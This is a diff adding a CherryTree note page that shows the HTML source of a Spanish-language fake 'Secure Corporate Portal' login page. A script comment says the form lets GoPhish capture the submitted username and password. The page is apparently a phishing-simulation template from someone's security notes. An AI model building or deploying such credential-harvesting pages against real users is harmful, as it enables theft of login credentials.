@@ -1,0 +1,168 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>HTML Landing Page</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../../../../../../../res/styles.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <p>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;es&quot;&gt;&lt;head&gt;</p>
+    <p>&lt;meta charset=&quot;UTF-8&quot;/&gt;</p>
+    <p>&lt;title&gt;Corporate Access Portal&lt;/title&gt;</p>
+    <p></p>
+    <p>&lt;style&gt;</p>
+    <p> body {</p>
+    <p> margin: 0;</p>
+    <p> font-family: &quot;Segoe UI&quot;, Arial, sans-serif;</p>
+    <p> background: linear-gradient(135deg, #0b1220, #111827);</p>
+    <p> color: #e5e7eb;</p>
+    <p> display: flex;</p>
+    <p> justify-content: center;</p>
+    <p> align-items: center;</p>
+    <p> height: 100vh;</p>
+    <p> }</p>
+    <p></p>
+    <p> .card {</p>
+    <p> width: 380px;</p>
+    <p> background: rgba(17, 24, 39, 0.95);</p>
+    <p> padding: 35px;</p>
+    <p> border-radius: 14px;</p>
+    <p> box-shadow: 0 20px 40px rgba(0,0,0,0.6);</p>
+    <p> text-align: center;</p>
+    <p> }</p>
+    <p></p>
+    <p> .logo {</p>
+    <p> font-size: 18px;</p>
+    <p> font-weight: 600;</p>
+    <p> color: #60a5fa;</p>
+    <p> margin-bottom: 10px;</p>
+    <p> letter-spacing: 1px;</p>
+    <p> }</p>
+    <p></p>
+    <p> h2 {</p>
+    <p> margin: 10px 0;</p>
+    <p> font-size: 20px;</p>
+    <p> }</p>
+    <p></p>
+    <p> .subtitle {</p>
+    <p> font-size: 13px;</p>
+    <p> color: #9ca3af;</p>
+    <p> margin-bottom: 25px;</p>
+    <p> }</p>
+    <p></p>
+    <p> input {</p>
+    <p> width: 100%;</p>
+    <p> padding: 12px;</p>
+    <p> margin: 10px 0;</p>
+    <p> border-radius: 8px;</p>
+    <p> border: 1px solid #374151;</p>
+    <p> background: #111827;</p>
+    <p> color: white;</p>
+    <p> outline: none;</p>
+    <p> transition: 0.2s;</p>
+    <p> }</p>
+    <p></p>
+    <p> input:focus {</p>
+    <p> border-color: #3b82f6;</p>
+    <p> }</p>
+    <p></p>
+    <p> button {</p>
+    <p> width: 100%;</p>
+    <p> padding: 12px;</p>
+    <p> margin-top: 10px;</p>
+    <p> background: #2563eb;</p>
+    <p> border: none;</p>
+    <p> border-radius: 8px;</p>
+    <p> color: white;</p>
+    <p> font-weight: 600;</p>
+    <p> cursor: pointer;</p>
+    <p> transition: 0.2s;</p>
+    <p> }</p>
+    <p></p>
+    <p> button:hover {</p>
+    <p> background: #1d4ed8;</p>
+    <p> }</p>
+    <p></p>
+    <p> .footer {</p>
+    <p> margin-top: 18px;</p>
+    <p> font-size: 11px;</p>
+    <p> color: #6b7280;</p>
+    <p> }</p>
+    <p></p>
+    <p> .status {</p>
+    <p> font-size: 12px;</p>
+    <p> color: #94a3b8;</p>
+    <p> margin-bottom: 15px;</p>
+    <p> }</p>
+    <p></p>
+    <p> .spinner {</p>
+    <p> display: none;</p>
+    <p> margin: 15px auto;</p>
+    <p> width: 38px;</p>
+    <p> height: 38px;</p>
+    <p> border: 4px solid #334155;</p>
+    <p> border-top: 4px solid #60a5fa;</p>
+    <p> border-radius: 50%;</p>
+    <p> animation: spin 1s linear infinite;</p>
+    <p> }</p>
+    <p></p>
+    <p> @keyframes spin {</p>
+    <p> 100% { transform: rotate(360deg); }</p>
+    <p> }</p>
+    <p></p>
+    <p>&lt;/style&gt;</p>
+    <p>&lt;/head&gt;</p>
+    <p></p>
+    <p>&lt;body&gt;</p>
+    <p></p>
+    <p>&lt;div class=&quot;card&quot;&gt;</p>
+    <p></p>
+    <p> &lt;div class=&quot;logo&quot;&gt;Secure Corporate Portal&lt;/div&gt;</p>
+    <p></p>
+    <p> &lt;h2&gt;Acceso autenticado&lt;/h2&gt;</p>
+    <p></p>
+    <p> &lt;div class=&quot;status&quot;&gt;</p>
+    <p> Verificación de seguridad requerida antes de continuar</p>
+    <p> &lt;/div&gt;</p>
+    <p></p>
+    <p> &lt;form id=&quot;loginForm&quot; method=&quot;POST&quot; action=&quot;&quot;&gt;</p>
+    <p></p>
+    <p> &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Usuario corporativo&quot;
+      required=&quot;&quot;/&gt;</p>
+    <p></p>
+    <p> &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Contraseña&quot;
+      required=&quot;&quot;/&gt;</p>
+    <p></p>
+    <p> &lt;button type=&quot;submit&quot;&gt;Iniciar sesión&lt;/button&gt;</p>
+    <p></p>
+    <p> &lt;/form&gt;</p>
+    <p></p>
+    <p> &lt;div class=&quot;spinner&quot; id=&quot;spinner&quot;&gt;&lt;/div&gt;</p>
+    <p></p>
+    <p> &lt;div class=&quot;footer&quot;&gt;</p>
+    <p> Sistema de autenticación segura · Acceso restringido</p>
+    <p> &lt;/div&gt;</p>
+    <p></p>
+    <p>&lt;/div&gt;</p>
+    <p></p>
+    <p>&lt;script&gt;</p>
+    <p>document.getElementById(&quot;loginForm&quot;).addEventListener(&quot;submit&quot;, function() {</p>
+    <p> </p>
+    <p> // deja que GoPhish capture el POST</p>
+    <p> setTimeout(() =&gt; {</p>
+    <p> document.getElementById(&quot;loginForm&quot;).style.display = &quot;none&quot;;</p>
+    <p> document.getElementById(&quot;spinner&quot;).style.display = &quot;block&quot;;</p>
+    <p> }, 150);</p>
+    <p></p>
+    <p>});</p>
+    <p>&lt;/script&gt;</p>
+    <p>&lt;/body&gt;</p>
+    <p>&lt;/html&gt;</p>
+  </div>
+</body>
+
+</html>
